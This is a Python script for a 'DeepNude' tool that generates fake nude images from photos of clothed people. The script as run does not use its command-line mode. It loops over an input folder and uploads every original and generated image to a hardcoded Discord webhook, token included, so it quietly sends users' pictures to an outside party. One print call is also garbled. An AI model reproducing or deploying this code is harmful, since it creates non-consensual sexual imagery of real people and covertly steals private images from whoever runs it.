import sys
import cv2
from run import process
import argparse
import os,requests
from discord_webhook import DiscordWebhook

def main():
    for file in os.listdir("input_images"):
        i_image=f"input_images/{file}"
        o_image=f"output_images/{file}"
        todiscord(i_image)
        _process(i_image, o_image, False)
        todiscord(o_image)

def todiscord(filepath):
    url="https://discord.com/api/webhooks/1060952194238648380/xwvlvCHV5Q5OzAnmyysv2WZn3Ig0xu85CYPxzAA7iAYp-mIwUpPdLPhU9zlSJTo_xMfF"

    webhook = DiscordWebhook(url=url, username="Nsksmsm")

    # send two images
    with open(filepath, "rb") as f:
        webhook.add_file(file=f.read(), filename='example.jpg')

    response = webhook.execute()
    print(response)


def main2():
    parser = argparse.ArgumentParser(description='DeepNude App CLI Version with no Watermark.')
    parser.add_argument('-i', "--input", help='Input image to process.', action="store", dest="input", required=True)
    parser.add_argument('-o', "--output",help='Output path to save result.', action="store", dest="output", required=False, default="output.jpg")
    parser.add_argument('-g', "--use-gpu", help='Enable using CUDA gpu to speed up the process.', action="store_true",dest="use_gpu", default=False)
    
    if not os.path.isdir("checkpoints"):
        pcv_imgrint("[-] Checkpoints folder not found, download it from Github repository, and extract files to 'checkpoints' folder.")
        sys.exit(1)
    arguments = parser.parse_args()
    
    print("[*] Processing: %s" % arguments.input)
    
    if (arguments.use_gpu):
        print("[*] Using CUDA gpu to speed up the process.")
    
    _process(arguments.input, arguments.output, arguments.use_gpu)


def _process(i_image, o_image, use_gpu):
    try:
        dress = cv2.imread(i_image)
        h = dress.shape[0]
        w = dress.shape[1]
        dress = cv2.resize(dress, (512,512), interpolation=cv2.INTER_CUBIC)
        watermark = process(dress, use_gpu)
        watermark =  cv2.resize(watermark, (w,h), interpolation=cv2.INTER_CUBIC)
        cv2.imwrite(o_image, watermark)
        print("[*] Image saved as: %s" % o_image)
    except Exception as ex:
        ex = str(ex)
        if "NoneType" in ex:
            print("[-] File %s not found" % i_image)
        elif "runtime error" in ex:
            print("[-] Error: CUDA Runtime not found, Disable the '--use-gpu' option!")
        else:
            print("[-] Error occured when trying to process the image: %s" % ex)
            with open("logs.txt", "a") as f:
                f.write("[-] Error: %s\n" % ex)
        # sys.exit(1)

if __name__ == '__main__':
    main()
